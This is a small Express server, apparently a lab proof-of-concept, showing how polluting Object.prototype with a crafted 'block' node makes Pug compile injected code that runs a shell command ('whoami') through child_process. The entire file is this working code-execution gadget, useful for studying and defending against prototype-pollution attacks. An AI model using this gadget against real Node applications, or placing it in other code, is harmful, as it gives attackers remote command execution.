const express = require('express');
const pug = require('pug');
const app = express();
const port = 3000;

Object.prototype.block = {"type": "Text", "line": "console.log(process.mainModule.require('child_process').execSync('whoami').toString())"};

app.set('view engine', 'pug');

app.get('/page', (req,res) => {
  const source = `h1= msg`;

  var fn = pug.compile(source);
  var html = fn({msg: 'It works'});

  res.send(fn.toString());

});

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
});